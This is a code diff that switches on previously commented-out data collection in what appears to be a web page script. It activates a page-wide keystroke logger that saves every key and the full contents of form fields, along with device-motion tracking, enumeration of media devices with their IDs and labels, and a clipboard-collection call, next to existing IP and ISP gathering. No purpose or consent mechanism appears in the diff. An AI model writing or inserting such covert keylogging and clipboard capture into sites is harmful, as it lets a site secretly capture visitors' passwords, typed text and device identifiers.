@@ -3,23 +3,23 @@
 //     Object.entries(localStorage).forEach(([k, v]) => console.log(`${k} : ${v}`));
 // }
 
-// var keyData = {}
-// keyData.behavior = {
-//     keyPresses: []
-// };
+var keyData = {}
+keyData.behavior = {
+    keyPresses: []
+};
 
-// document.addEventListener('keydown', (e) => {
-//     keyData.behavior.keyPresses.push({
-//         key: e.key,       // Full key logs (including special keys)
-//         code: e.code,
-//         time: Date.now(),
-//         target: e.target.tagName,
-//         isFormField: ['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName),
-//         value: e.target.value // Includes all typed content 
-//     });
-//     // console.clear();
-//     // console.log(keyData)
-// });
+document.addEventListener('keydown', (e) => {
+    keyData.behavior.keyPresses.push({
+        key: e.key,       // Full key logs (including special keys)
+        code: e.code,
+        time: Date.now(),
+        target: e.target.tagName,
+        isFormField: ['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName),
+        value: e.target.value // Includes all typed content 
+    });
+    // console.clear();
+    // console.log(keyData)
+});
 
 
 
@@ -504,32 +504,32 @@ async function sha256(str) {
     console.error("Device orientation error:", e);
 }
 
-        // if ('DeviceMotionEvent' in window) {
-        //     window.addEventListener('devicemotion', (event) => {
-        //         userData.deviceMotion = {
-        //             acceleration: event.acceleration,
-        //             accelerationIncludingGravity: event.accelerationIncludingGravity,
-        //             rotationRate: event.rotationRate,
-        //             interval: event.interval
-        //         };
-        //     }, true);
-        // }
+        if ('DeviceMotionEvent' in window) {
+            window.addEventListener('devicemotion', (event) => {
+                userData.deviceMotion = {
+                    acceleration: event.acceleration,
+                    accelerationIncludingGravity: event.accelerationIncludingGravity,
+                    rotationRate: event.rotationRate,
+                    interval: event.interval
+                };
+            }, true);
+        }
 
         // Media devices enumeration
-        // if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
-        //     navigator.mediaDevices.enumerateDevices()
-        //         .then(devices => {
-        //             userData.mediaDevices = devices.map(device => ({
-        //                 kind: device.kind,
-        //                 label: device.label,
-        //                 deviceId: device.deviceId,
-        //                 groupId: device.groupId
-        //             }));
-        //         })
-        //         .catch(e => {
-        //             userData.mediaDevicesError = e.message;
-        //         });
-        // }
+        if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
+            navigator.mediaDevices.enumerateDevices()
+                .then(devices => {
+                    userData.mediaDevices = devices.map(device => ({
+                        kind: device.kind,
+                        label: device.label,
+                        deviceId: device.deviceId,
+                        groupId: device.groupId
+                    }));
+                })
+                .catch(e => {
+                    userData.mediaDevicesError = e.message;
+                });
+        }
 
         // Bluetooth availability
         if ('bluetooth' in navigator) {
@@ -581,7 +581,7 @@ async function sha256(str) {
         try{
 
             const cityName = await collectNetworkInfo(); // Added IP and ISP collection
-            // collectClipboardData();
+            collectClipboardData();
             collectBasicInfo();
             collectBehavioralData();
             
